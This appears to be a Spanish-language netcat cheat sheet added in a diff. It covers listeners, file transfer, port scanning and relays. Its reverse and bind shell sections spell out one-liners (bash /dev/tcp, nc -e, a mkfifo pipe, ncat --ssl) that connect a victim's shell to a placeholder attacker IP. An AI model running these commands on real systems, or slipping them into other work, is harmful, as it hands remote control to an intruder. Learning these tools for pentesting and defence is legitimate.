@@ -1,0 +1,116 @@
+================================================================================
+                        NETCAT - CHEATSHEET
+			Autor: D1n0
+================================================================================
+
+--- ESCUCHA (LISTENER) ---
+
+# Escuchar en puerto
+nc -lvnp 4444
+
+# Flags:
+#   -l  = listen mode
+#   -v  = verbose
+#   -n  = no DNS resolution
+#   -p  = puerto
+
+
+--- CONEXIÓN A TARGET ---
+
+# Conectar a IP:puerto
+nc 192.168.1.10 4444
+
+# Banner grabbing (ver qué servicio hay)
+nc -v 192.168.1.10 80
+
+# Conexión con timeout
+nc -w 3 192.168.1.10 80
+
+
+--- TRANSFERENCIA DE FICHEROS ---
+
+# Receptor (quien recibe el fichero)
+nc -lvnp 4444 > fichero_recibido.txt
+
+# Emisor (quien envía el fichero)
+nc 192.168.1.10 4444 < fichero_a_enviar.txt
+
+# Transferir binario/zip
+nc -lvnp 4444 > archivo.zip
+nc 192.168.1.10 4444 < archivo.zip
+
+
+--- REVERSE SHELL ---
+
+# Listener en atacante
+nc -lvnp 4444
+
+# Víctima Linux ejecuta:
+bash -i >& /dev/tcp/192.168.1.ATACANTE/4444 0>&1
+
+# Víctima con nc (versión con -e)
+nc 192.168.1.ATACANTE 4444 -e /bin/bash
+
+# Víctima con nc (versión sin -e, usando mkfifo)
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.ATACANTE 4444 >/tmp/f
+
+# Víctima Windows
+nc.exe 192.168.1.ATACANTE 4444 -e cmd.exe
+
+
+--- BIND SHELL ---
+
+# Víctima pone la shell a la escucha (con -e)
+nc -lvnp 4444 -e /bin/bash
+
+# Atacante se conecta
+nc 192.168.1.VICTIMA 4444
+
+
+--- PORT SCANNING CON NETCAT ---
+
+# Escaneo de puertos TCP
+nc -zv 192.168.1.10 20-80
+
+# Escaneo UDP
+nc -zvu 192.168.1.10 53
+
+# Flag -z = zero-I/O mode (solo escaneo, no envía datos)
+
+
+--- CHAT SIMPLE ENTRE DOS MÁQUINAS ---
+
+# Máquina A (escucha)
+nc -lvnp 4444
+
+# Máquina B (conecta)
+nc 192.168.1.A 4444
+
+
+--- PROXY / RELAY BÁSICO ---
+
+# Redirigir tráfico del puerto 8080 al 80 de otro host
+mkfifo /tmp/pipe
+nc -lvnp 8080 < /tmp/pipe | nc 192.168.1.10 80 > /tmp/pipe
+
+
+--- NCAT (versión Nmap, más features) ---
+
+# Listener con SSL
+ncat --ssl -lvnp 4444
+
+# Reverse shell cifrada
+ncat --ssl 192.168.1.ATACANTE 4444 -e /bin/bash
+
+# Listener que permite múltiples conexiones
+ncat -lvnp 4444 --keep-open
+
+
+--- NOTAS ---
+
+# En Kali la versión por defecto puede no tener -e
+# Usar: /usr/bin/nc.traditional  (si existe)
+# O usar ncat de nmap que sí lo soporta
+which nc ncat nc.traditional
+
+================================================================================
